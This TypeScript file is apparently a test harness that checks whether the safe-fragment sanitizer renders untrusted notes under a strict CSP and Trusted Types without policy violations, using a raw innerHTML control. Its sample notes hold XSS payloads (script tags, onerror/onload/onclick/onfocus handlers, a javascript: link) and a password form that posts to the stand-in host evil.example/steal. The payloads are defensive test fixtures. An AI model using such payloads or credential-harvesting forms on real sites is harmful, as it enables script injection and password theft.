import './workbench-tt.css';
import * as safeFragment from '@johnhenry/safe-fragment';
import type { SanitizationReport } from '@johnhenry/safe-fragment';

/* ────────────────────────────────────────────────────────────────────────────
 * The strict-CSP frame of the Untrusted Desk planet. A separate document (workbench/tt.html) that the planet embeds in an iframe.
 * Its <meta> CSP has `require-trusted-types-for 'script'` and `trusted-types dompurify`, no inline script or style, no eval.
 *
 * Two things are measured, separately:
 *   - safe-fragment's own rendering of untrusted notes: how many `securitypolicyviolation` events it causes (expected: 0);
 *   - the control, a raw `el.innerHTML = ...` on the same payload: it throws a TypeError and DOES cause a violation.
 * Violations are attributed by phase: events that arrive while the control runs (and its settle time) are the control's,
 * every other one is counted against safe-fragment. Nothing here assigns a string to an HTML sink, because that would throw.
 * ──────────────────────────────────────────────────────────────────────────── */

const PROFILES = ['article-v1', 'ui-v1', 'email-v1', 'plain-text-v1'] as const;
type Profile = (typeof PROFILES)[number];

declare global { interface Window { __ttPwned?: string[] } }
window.__ttPwned = [];
const mark = (what: string) => `window.__ttPwned = (window.__ttPwned || []).concat(${JSON.stringify(what)})`;

const NOTES: { title: string; body: string }[] = [
  {
    title: 'Pasted from a newsletter',
    body: `<h3>Q3 planning</h3><p>Big <strong>news</strong>: <a href="https://example.com/news">read more</a> or <a href="javascript:${mark('javascript: href')}">click here</a>.</p>
<img src="x" alt="tracking pixel" onerror="${mark('img onerror')}">
<script>${mark('script')}</script>
<svg onload="${mark('svg onload')}" width="10" height="10"><circle r="4"/></svg>
<p onclick="${mark('onclick')}">A paragraph with a click handler.</p>`,
  },
  { title: 'A form that wants your password', body: `<form action="https://evil.example/steal"><input name="pw" autofocus onfocus="${mark('onfocus')}"><button formaction="https://evil.example/steal">Send</button></form><p>Then some <em>harmless</em> text.</p>` },
  { title: 'Plain text', body: 'No markup here.\nLine breaks survive,\nand <b>this is not bold</b> under plain-text-v1.' },
];

const el = <K extends keyof HTMLElementTagNameMap>(tag: K, props: Partial<Record<string, string>> = {}, ...kids: (Node | string)[]): HTMLElementTagNameMap[K] => {
  const node = document.createElement(tag);
  for (const [k, v] of Object.entries(props)) if (v !== undefined) node.setAttribute(k, v);
  node.append(...kids);
  return node;
};
const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

/* ---- violation bookkeeping: registered first, before anything of safe-fragment's runs ---- */
let phase: 'safe-fragment' | 'control' = 'safe-fragment';
const counts = { safeFragment: 0, control: 0 };
const samples: string[] = [];
const onViolation = (event: SecurityPolicyViolationEvent) => {
  const who = phase === 'control' ? 'control' : 'safe-fragment';
  if (phase === 'control') counts.control++; else counts.safeFragment++;
  samples.push(`[${who}] ${event.violatedDirective}: ${(event.sample || event.blockedURI || '').slice(0, 70)}`);
  paint();
};
document.addEventListener('securitypolicyviolation', onViolation);
// On Chromium safe-fragment parses in a hidden same-origin about:blank iframe (its "inert realm"), which inherits this policy. A violation
// there fires on THAT document, not this one, so listen on it too: otherwise the counter could read 0 while the console says otherwise.
const hooked = new WeakSet<Document>();
const hookRealms = () => {
  for (const frame of document.querySelectorAll('iframe')) {
    const doc = frame.contentDocument;
    if (doc && !hooked.has(doc)) { hooked.add(doc); doc.addEventListener('securitypolicyviolation', onViolation); }
  }
};
new MutationObserver(hookRealms).observe(document, { childList: true, subtree: true });

const state = { profile: 'article-v1' as Profile, engine: '…', controlResult: 'not tried yet', controlTried: false, renders: 0 };

const app = document.getElementById('app')!;
const cspText = document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') ?? '(no policy found)';
const statBox = (id: string, label: string) => { const b = el('b', {}, '0'); const s = el('div', { class: 'stat neutral', id }, b, el('span', {}, label)); return { s, b }; };

const sfStat = statBox('stat-sf', 'violations from safe-fragment rendering');
const ctlStat = statBox('stat-control', 'violations from the raw innerHTML control');
const canaryStat = statBox('stat-canary', 'payload handlers that ran');
const engineStat = statBox('stat-engine', 'sanitizer engine');
const verdict = el('p', { class: 'verdict', id: 'verdict' });
const notesBox = el('div', { id: 'notes' });
const sampleLog = el('pre', { id: 'samples' });
const profileBar = el('div', { class: 'bar', role: 'group', 'aria-label': 'safe-fragment profile' }, el('span', { class: 'lbl' }, 'profile'));
const profileButtons = PROFILES.map((p) => {
  const b = el('button', { type: 'button', 'data-profile': p, 'aria-pressed': 'false' }, p);
  b.addEventListener('click', () => { state.profile = p; void renderNotes(); });
  profileBar.append(b);
  return b;
});
const rawButton = el('button', { type: 'button', class: 'raw', id: 'raw-try' }, 'Try raw innerHTML');
rawButton.addEventListener('click', () => void rawControl());
profileBar.append(el('span', { class: 'lbl' }, ' '), rawButton);

app.replaceChildren(
  el('h1', {}, 'Strict CSP + Trusted Types ', el('span', {}, '· safe-fragment inside')),
  profileBar,
  el('div', { class: 'stats' }, sfStat.s, ctlStat.s, canaryStat.s, engineStat.s),
  verdict,
  el('div', { class: 'panel' }, el('h2', {}, 'the policy (from this page\'s <meta>)'), el('pre', { id: 'csp' }, cspText.split(';').map((d) => d.trim()).filter(Boolean).join(';\n') + ';')),
  el('div', { class: 'panel' }, el('h2', {}, 'untrusted notes, rendered through <safe-fragment>'), notesBox),
  el('div', { class: 'panel' }, el('h2', {}, 'violation events seen'), sampleLog),
);

function paint() {
  hookRealms();
  sfStat.b.textContent = String(counts.safeFragment);
  sfStat.s.className = `stat ${counts.safeFragment === 0 ? 'ok' : 'bad'}`;
  ctlStat.b.textContent = String(counts.control);
  ctlStat.s.className = `stat ${state.controlTried ? (counts.control > 0 ? 'ok' : 'bad') : 'neutral'}`;
  const ran = window.__ttPwned?.length ?? 0;
  canaryStat.b.textContent = String(ran);
  canaryStat.s.className = `stat ${ran === 0 ? 'ok' : 'bad'}`;
  engineStat.b.textContent = state.engine;
  engineStat.s.className = 'stat neutral';
  for (const b of profileButtons) b.setAttribute('aria-pressed', String(b.dataset.profile === state.profile));
  verdict.textContent = `${state.controlTried ? `Control: ${state.controlResult}. ` : ''}${counts.safeFragment === 0 ? 'safe-fragment rendered every note with zero policy violations.' : `safe-fragment caused ${counts.safeFragment} violation(s).`}`;
  verdict.className = `verdict ${counts.safeFragment === 0 ? 'ok' : 'bad'}`;
  sampleLog.textContent = samples.length ? samples.join('\n') : '(none)';
  document.body.dataset.ttCounts = `${counts.safeFragment}/${counts.control}`;
  // The planet mirrors these numbers outside the frame. Same origin, and only ever this one message shape.
  parent.postMessage({ wbTT: { profile: state.profile, engine: state.engine, safeFragmentViolations: counts.safeFragment, controlViolations: counts.control, controlBlocked: state.controlResult.startsWith('blocked'), controlTried: state.controlTried, ran, renders: state.renders } }, location.origin);
}

/** Render every note through <safe-fragment>: the string goes in as a property, never through an HTML sink. */
async function renderNotes() {
  phase = 'safe-fragment';
  document.body.dataset.ttState = 'rendering';
  const reports: Promise<unknown>[] = [];
  const cards = NOTES.map((n) => {
    const frag = document.createElement('safe-fragment') as HTMLElement & { profile: string; html: string };
    frag.setAttribute('render-mode', 'replace');
    frag.profile = state.profile;
    reports.push(new Promise((resolve) => {
      frag.addEventListener('safe-fragment:render', (e) => resolve((e as CustomEvent<{ report: SanitizationReport }>).detail.report), { once: true });
      frag.addEventListener('safe-fragment:reject', (e) => resolve((e as CustomEvent).detail), { once: true });
    }));
    frag.html = n.body;
    return el('div', { class: 'note' }, el('h3', {}, n.title), frag);
  });
  notesBox.replaceChildren(...cards);
  await Promise.race([Promise.all(reports), sleep(4000)]);
  state.renders++;
  paint();
  await sleep(450); // a violation that safe-fragment caused would have arrived by now (and be counted against it)
  document.body.dataset.ttState = 'idle';
  paint();
}

/** The control: the very same hostile string, assigned the way unsafe code does it. Trusted Types refuses it. */
async function rawControl() {
  phase = 'control';
  state.controlTried = true;
  const host = el('div');
  try {
    host.innerHTML = NOTES[0].body; // eslint-disable-line -- deliberate: this is the control
    state.controlResult = 'NOT blocked (unexpected)';
    document.body.append(host);
  } catch (error) {
    state.controlResult = `blocked, ${(error as Error).name}: ${(error as Error).message.slice(0, 90)}`;
  }
  paint();
  await sleep(450); // securitypolicyviolation is queued as a task: wait for it before switching the attribution back
  phase = 'safe-fragment';
  document.body.dataset.ttControl = counts.control > 0 ? 'reported' : 'silent';
  paint();
}

async function start() {
  safeFragment.registerSafeFragment();
  try { state.engine = await safeFragment.preloadSanitizer(); } catch (error) { state.engine = 'unavailable'; samples.push(`preload failed: ${(error as Error).message}`); }
  paint();
  await renderNotes();
  await rawControl(); // zero-input proof: the attempt has already been made when the planet opens
  document.body.dataset.ttState = 'done';
  paint();
}
start().catch((error) => { verdict.textContent = `frame failed: ${String((error as Error)?.stack ?? error)}`; verdict.className = 'verdict bad'; document.body.dataset.ttState = 'failed'; });
